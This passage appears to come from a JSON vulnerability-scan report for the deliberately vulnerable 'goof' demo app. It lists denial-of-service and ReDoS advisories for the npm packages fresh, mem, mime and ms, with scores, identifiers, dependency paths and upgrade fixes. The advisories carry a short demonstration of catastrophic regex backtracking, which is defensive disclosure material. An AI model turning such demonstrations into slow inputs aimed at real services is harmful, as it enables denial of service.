{\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"fresh\"\n      },\n      \"version\": [\n        \"<0.5.2\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"fresh\"\n      },\n      \"version\": [\n        \"<0.5.2\"\n      ]\n    }\n  ],\n  \"id\": \"npm:fresh:20170908\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-FRESH-10791\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-16119\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-9qj9-36jm-prpv\"\n    ],\n    \"NSP\": [\n      \"526\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:11.708092Z\",\n  \"moduleName\": \"fresh\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"fresh\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2017-09-27T08:48:49Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jshttp/fresh/commit/21a0f0c2a5f447e0d40bc16be0c23fa98a7b46ec\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/jshttp/fresh/issues/24\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.5.2\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"express@4.12.4\",\n    \"fresh@0.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"express@4.15.5\",\n    \"fresh@0.5.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"fresh\",\n  \"version\": \"0.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , fresh@0.2.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , send@0.12.3 , fresh@0.2.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , serve-static@1.9.3 , send@0.12.3 , fresh@0.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": [
              "4xcv-9jjx-gfj3"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Denial of Service (DoS)",
          "id": "npm:mem:20180117",
          "desc": "## Overview\n \n[mem](https://www.npmjs.com/package/mem) is an optimization used to speed up consecutive function calls by caching the result of calls with identical input.\n\n\nAffected versions of this package are vulnerable to Denial of Service (DoS).\nOld results were deleted from the cache and could cause a memory leak.\n\n## details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\r\n\r\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\r\n\r\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\r\n\r\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\r\n\r\nTwo common types of DoS vulnerabilities:\r\n\r\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\r\n\r\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)\n\n## Remediation\n\nUpgrade mem to version 4.0.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/sindresorhus/mem/commit/da4e4398cb27b602de3bd55f746efa9b4a31702b)\n\n- [GitHub Issue](https://github.com/sindresorhus/mem/issues/14)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MEM-11138\"\n  ],\n  \"creationTime\": \"2018-01-17T18:19:13Z\",\n  \"credit\": [\n    \"juancampa\"\n  ],\n  \"cvssScore\": 5.1,\n  \"description\": \"## Overview\\n \\n[mem](https://www.npmjs.com/package/mem) is an optimization used to speed up consecutive function calls by caching the result of calls with identical input.\\n\\n\\nAffected versions of this package are vulnerable to Denial of Service (DoS).\\nOld results were deleted from the cache and could cause a memory leak.\\n\\n## details\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\\r\\n\\r\\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\\r\\n\\r\\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\\r\\n\\r\\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\\r\\n\\r\\nTwo common types of DoS vulnerabilities:\\r\\n\\r\\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\\r\\n\\r\\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)\\n\\n## Remediation\\n\\nUpgrade mem to version 4.0.0 or higher.\\n\\n\\n## References\\n\\n- [GitHub Commit](https://github.com/sindresorhus/mem/commit/da4e4398cb27b602de3bd55f746efa9b4a31702b)\\n\\n- [GitHub Issue](https://github.com/sindresorhus/mem/issues/14)\\n\",\n  \"disclosureTime\": \"2018-01-17T18:19:13Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"4.0.0\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports.memoized\"\n      },\n      \"version\": [\n        \"<=1.1.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports.memoized.setData\"\n      },\n      \"version\": [\n        \">1.1.0<4.0.0\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports.memoized\"\n      },\n      \"version\": [\n        \"<=1.1.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports.memoized.setData\"\n      },\n      \"version\": [\n        \">1.1.0<4.0.0\"\n      ]\n    }\n  ],\n  \"id\": \"npm:mem:20180117\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MEM-11138\"\n    ],\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-4xcv-9jjx-gfj3\"\n    ],\n    \"NSP\": [\n      \"1084\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:35.054482Z\",\n  \"moduleName\": \"mem\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mem\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2018-08-29T11:23:09Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/sindresorhus/mem/commit/da4e4398cb27b602de3bd55f746efa9b4a31702b\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/sindresorhus/mem/issues/14\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.0.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Denial of Service (DoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"yargs@11.1.0\",\n    \"os-locale@2.1.0\",\n    \"mem@1.1.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@12.0.2\",\n    \"nyc@13.2.0\",\n    \"yargs@12.0.5\",\n    \"os-locale@3.0.1\",\n    \"mem@4.0.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"mem\",\n  \"version\": \"1.1.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , yargs@11.1.0 , os-locale@2.1.0 , mem@1.1.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2017-16138"
            ],
            "ghsaid": [
              "wrvr-8mpx-r7pp"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:mime:20170907",
          "desc": "## Overview\n[mime](https://www.npmjs.com/package/mime) is a comprehensive, compact MIME type module.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It uses regex the following regex `/.*[\\.\\/\\\\]/` in its lookup, which can cause a slowdown of 2 seconds for 50k characters.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `mime` to version 1.4.1, 2.0.3 or higher.\n## References\n- [GitHub Commit](https://github.com/broofa/node-mime/commit/1df903fdeb9ae7eaa048795b8d580ce2c98f40b0)\n- [GitHub Commit](https://github.com/broofa/node-mime/commit/855d0c4b8b22e4a80b9401a81f2872058eae274d)\n- [GitHub Issue](https://github.com/broofa/node-mime/issues/167)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/535)\n",
          "impact": 0.3,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MIME-10788\"\n  ],\n  \"creationTime\": \"2017-09-26T05:48:40.307000Z\",\n  \"credit\": [\n    \"Cristian-Alexandru Staicu\"\n  ],\n  \"cvssScore\": 3.7,\n  \"description\": \"## Overview\\n[mime](https://www.npmjs.com/package/mime) is a comprehensive, compact MIME type module.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It uses regex the following regex `/.*[\\\\.\\\\/\\\\\\\\]/` in its lookup, which can cause a slowdown of 2 seconds for 50k characters.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `mime` to version 1.4.1, 2.0.3 or higher.\\n## References\\n- [GitHub Commit](https://github.com/broofa/node-mime/commit/1df903fdeb9ae7eaa048795b8d580ce2c98f40b0)\\n- [GitHub Commit](https://github.com/broofa/node-mime/commit/855d0c4b8b22e4a80b9401a81f2872058eae274d)\\n- [GitHub Issue](https://github.com/broofa/node-mime/issues/167)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/535)\\n\",\n  \"disclosureTime\": \"2017-09-07T21:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"1.4.1\",\n    \"2.0.3\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"mime.js\",\n        \"functionName\": \"mime.module.exports.lookup\"\n      },\n      \"version\": [\n        \"<1.2.6\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"mime.js\",\n        \"functionName\": \"Mime.prototype.lookup\"\n      },\n      \"version\": [\n        \">=1.2.6 <1.4.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"Mime.js\",\n        \"functionName\": \"Mime.prototype.getType\"\n      },\n      \"version\": [\n        \">=2.0.0 <2.0.3\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"mime.js\",\n        \"functionName\": \"mime.module.exports.lookup\"\n      },\n      \"version\": [\n        \"<1.2.6\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"mime.js\",\n        \"functionName\": \"Mime.prototype.lookup\"\n      },\n      \"version\": [\n        \">=1.2.6 <1.4.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"Mime.js\",\n        \"functionName\": \"Mime.prototype.getType\"\n      },\n      \"version\": [\n        \">=2.0.0 <2.0.3\"\n      ]\n    }\n  ],\n  \"id\": \"npm:mime:20170907\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MIME-10788\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-16138\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-wrvr-8mpx-r7pp\"\n    ],\n    \"NSP\": [\n      \"535\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:11.685484Z\",\n  \"moduleName\": \"mime\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mime\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:mime:20170907:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.877450Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/mime/20170907/mime_20170907_0_0_855d0c4b8b22e4a80b9401a81f2872058eae274d.patch\"\n      ],\n      \"version\": \"=1.2.11 || =1.3.4\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2017-09-27T05:48:40Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/broofa/node-mime/commit/1df903fdeb9ae7eaa048795b8d580ce2c98f40b0\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/broofa/node-mime/commit/855d0c4b8b22e4a80b9401a81f2872058eae274d\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/broofa/node-mime/issues/167\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/535\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.4.1\",\n      \">=2.0.0 <2.0.3\"\n    ]\n  },\n  \"severity\": \"low\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"low\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"express@4.12.4\",\n    \"send@0.12.3\",\n    \"mime@1.3.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"express@4.16.0\",\n    \"send@0.16.0\",\n    \"mime@1.4.1\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"mime\",\n  \"version\": \"1.3.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , send@0.12.3 , mime@1.3.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , serve-static@1.9.3 , send@0.12.3 , mime@1.3.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , st@0.2.4 , mime@1.2.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2015-8315"
            ],
            "ghsaid": [
              "3fx5-fwvr-xrjg"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:ms:20151024",
          "desc": "## Overview\n\n[ms](https://www.npmjs.com/package/ms) is a tiny milisecond conversion utility.\n\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\nattack when converting a time period string (i.e. `\"2 days\"`, `\"1h\"`) into a milliseconds integer. A malicious user could pass extremely long strings to `ms()`, causing the server to take a long time to process, subsequently blocking the event loop for that extended period.\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\n\nUpgrade `ms` to version 0.7.1 or higher.\n\n\n## References\n\n- [OSS security Advisory](https://www.openwall.com/lists/oss-security/2016/04/20/11)\n\n- [OWASP - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\n\n- [Security Focus](https://www.securityfocus.com/bid/96389)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MS-10064\"\n  ],\n  \"creationTime\": \"2015-11-06T02:09:36.187000Z\",\n  \"credit\": [\n    \"Adam Baldwin\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n\\n[ms](https://www.npmjs.com/package/ms) is a tiny milisecond conversion utility.\\n\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\\nattack when converting a time period string (i.e. `\\\"2 days\\\"`, `\\\"1h\\\"`) into a milliseconds integer. A malicious user could pass extremely long strings to `ms()`, causing the server to take a long time to process, subsequently blocking the event loop for that extended period.\\n\\n## Details\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\r\\n\\r\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\r\\n\\r\\nLet’s take the following regular expression as an example:\\r\\n```js\\r\\nregex = /A(B|C+)+D/\\r\\n```\\r\\n\\r\\nThis regular expression accomplishes the following:\\r\\n- `A` The string must start with the letter 'A'\\r\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\r\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\r\\n\\r\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\r\\n\\r\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\r\\n\\r\\n```bash\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\r\\n0.04s user 0.01s system 95% cpu 0.052 total\\r\\n\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\r\\n1.79s user 0.02s system 99% cpu 1.812 total\\r\\n```\\r\\n\\r\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\r\\n\\r\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\r\\n\\r\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\r\\n1. CCC\\r\\n2. CC+C\\r\\n3. C+CC\\r\\n4. C+C+C.\\r\\n\\r\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\r\\n\\r\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\r\\n\\r\\n| String | Number of C's | Number of steps |\\r\\n| -------|-------------:| -----:|\\r\\n| ACCCX | 3 | 38\\r\\n| ACCCCX | 4 | 71\\r\\n| ACCCCCX | 5 | 136\\r\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\r\\n\\r\\n\\r\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\n\\nUpgrade `ms` to version 